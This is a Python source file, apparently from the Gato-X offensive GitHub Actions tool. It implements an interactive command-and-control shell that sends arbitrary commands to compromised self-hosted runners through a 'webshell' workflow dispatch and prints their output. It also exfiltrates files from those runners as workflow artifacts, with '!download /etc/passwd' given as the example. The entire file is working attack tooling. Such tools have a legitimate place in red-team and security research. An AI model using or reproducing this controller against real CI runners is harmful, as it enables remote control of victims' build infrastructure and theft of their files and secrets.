"""
Copyright 2025, Adnan Khan

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

import asyncio
import re
from typing import Optional

from gatox.cli.output import Output
from .webshell_utils import WebShellUtils


class C2Controller:
    """Handles C2 command and control operations for WebShell attacks."""

    LINE_PATTERN = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{7}Z\s(.*)$")

    def __init__(self, api, user_perms: dict, timeout: int = 30):
        self.api = api
        self.user_perms = user_perms
        self.timeout = timeout

    async def interact_webshell(self, c2_repo: str, runner_name: str = None) -> bool:
        """
        Interacts with the webshell to issue commands.

        Args:
            c2_repo: C2 repository name
            runner_name: Specific runner name to use

        Returns:
            True if successful, False otherwise
        """
        if "repo" not in self.user_perms["scopes"]:
            Output.error("Insufficient scopes for C2 operator PAT!")
            return False

        # Handle repository name format
        if "/" not in c2_repo:
            username = self.user_perms["user"]
            c2_repo = f"{username}/{c2_repo}"

        # Get available runners
        runners = await self.api.get_repo_runners(c2_repo)
        if not runners:
            Output.error("No runners connected to C2 repository!")
            return False

        if not runner_name:
            runner_name = runners[0]["name"]

        # Display welcome message and commands
        self._display_welcome_message()

        try:
            while True:
                command = input(f"Command({Output.red(runner_name)})$ ")

                if command in ["exit", "!exit"]:
                    print("Exiting shell...")
                    break
                elif command == "!list_runners":
                    await self.list_runners(c2_repo)
                elif command.startswith("!select"):
                    runner_name = self._handle_runner_selection(command)
                elif command.startswith("!download"):
                    await self._handle_download_command(command, c2_repo, runner_name)
                elif command.startswith("!timeout"):
                    self._handle_timeout_command(command)
                elif command:
                    await self.issue_command(
                        c2_repo, command, timeout=self.timeout, runner_name=runner_name
                    )
                else:
                    Output.error("Command was empty!")

        except KeyboardInterrupt:
            print("Exiting shell...")

        return True

    def _display_welcome_message(self):
        """Display welcome message and available commands."""
        Output.info("Welcome to the Gato-X Webshell! Type 'exit' or '!exit' to exit.")
        Output.info(
            "The following meta commands are available, anything else will be sent to the target:"
        )
        Output.tabbed(
            "!list_runners - Lists all runners and labels connected to the C2 repository."
        )
        Output.tabbed("!select - Change the runner selection.")
        Output.tabbed(
            "!download SOURCE - Download the specified file from the runner as a workflow artifact. E.g.: !download /etc/passwd"
        )
        Output.tabbed(
            "!timeout - Change the timeout value in seconds, this can be useful for long running commands. Example: !timeout 500"
        )

    def _handle_runner_selection(self, command: str) -> str:
        """Handle runner selection command."""
        parts = command.split(" ")
        if len(parts) == 2:
            return parts[1]
        else:
            Output.error("Invalid runner select command!")
            return ""

    async def _handle_download_command(
        self, command: str, c2_repo: str, runner_name: str
    ):
        """Handle file download command."""
        parts = command.split(" ")
        if len(parts) == 2:
            file_download = parts[1]
            await self.issue_command(
                c2_repo,
                file_download,
                timeout=self.timeout,
                runner_name=runner_name,
                download=True,
            )
        else:
            Output.error("Invalid download command!")

    def _handle_timeout_command(self, command: str):
        """Handle timeout change command."""
        parts = command.split(" ")
        if len(parts) == 2:
            try:
                self.timeout = int(parts[1])
                Output.info(f"Timeout set to {self.timeout} seconds.")
            except ValueError:
                Output.error("Invalid timeout value!")
        else:
            Output.error("Invalid timeout command!")

    async def issue_command(
        self,
        c2_repo: str,
        parameter: str,
        timeout: int = 30,
        workflow_name: str = "webshell.yml",
        runner_name: str = "gato-ror",
        download: bool = False,
    ) -> Optional[bool]:
        """
        Issue a command to a GitHub Actions runner and retrieve the output.

        Args:
            c2_repo: The name of the repository in 'owner/repo' format
            parameter: The command to be executed or file to download
            timeout: Maximum time to wait for workflow completion
            workflow_name: Name of the workflow file
            runner_name: Name of the runner where command will be executed
            download: If True, parameter is treated as a file to download

        Returns:
            True if successful, False otherwise, None if failed
        """
        dispatch_input = {"runner": runner_name}

        if download:
            dispatch_input["download_file"] = parameter
        else:
            dispatch_input["cmd"] = parameter

        # Get current timestamp for filtering
        curr_time = WebShellUtils.get_current_timestamp()

        # Issue the dispatch
        success = await self.api.issue_dispatch(
            c2_repo,
            target_workflow=workflow_name,
            target_branch="main",
            dispatch_inputs=dispatch_input,
        )

        if not success:
            Output.error("Unable to issue command!")
            return None

        # Get latest commit for workflow tracking
        await asyncio.sleep(5)
        resp = await self.api.call_get(
            f"/repos/{c2_repo}/commits", params={"per_page": 1}
        )

        if resp.status_code != 200:
            Output.error("Failed to get repository commits!")
            return None

        commit_sha = resp.json()[0]["sha"]

        # Wait for workflow to appear
        workflow_id = await WebShellUtils.wait_for_workflow(
            self.api, c2_repo, commit_sha, "webshell", f">{curr_time}", timeout
        )

        if workflow_id is None:
            return None

        # Wait for workflow completion
        status = await WebShellUtils.wait_for_workflow_completion(
            self.api, c2_repo, workflow_id, self.timeout
        )

        if status is None:
            return False

        # Handle download vs command output
        if download:
            await self._handle_download_result(c2_repo, workflow_id)
        else:
            await self._handle_command_output(c2_repo, workflow_id)

        return True

    async def _handle_download_result(self, c2_repo: str, workflow_id: int):
        """Handle file download result."""
        dest = await self.api.download_workflow_artifact(
            c2_repo, workflow_id, f"{str(workflow_id)}_exfil.zip"
        )

        if dest:
            Output.info("Downloaded file to: " + dest)
        else:
            Output.error("Unable to download artifact!")

    async def _handle_command_output(self, c2_repo: str, workflow_id: int):
        """Handle command output parsing."""
        runlog = await self.api.retrieve_workflow_log(c2_repo, workflow_id, "build")

        if not runlog:
            Output.error("Unable to retrieve workflow log!")
            return

        content_lines = runlog.split("\n")
        grp_cnt = 0

        for line in content_lines:
            if "##[endgroup]" in line and grp_cnt != 2:
                grp_cnt += 1
                continue

            if "Cleaning up orphan processes" in line:
                break

            if grp_cnt == 2:
                match = self.LINE_PATTERN.match(line)
                if match:
                    print(match.group(1))
                else:
                    break

    async def list_runners(self, c2_repo: str):
        """Lists all runners connected to the C2 repository."""
        runners = await self.api.get_repo_runners(c2_repo)

        if not runners:
            Output.error("No runners connected to C2 repository!")
            return

        Output.info(f"There are {len(runners)} runner(s) connected to {c2_repo}:")
        for runner in runners:
            runner_name = runner["name"]
            labels = ", ".join(
                [Output.yellow(label["name"]) for label in runner["labels"]]
            )
            status = runner["status"]
            Output.tabbed(
                f"Name: {Output.red(runner_name)} - Labels: {labels} - Status: {Output.bright(status)}"
            )
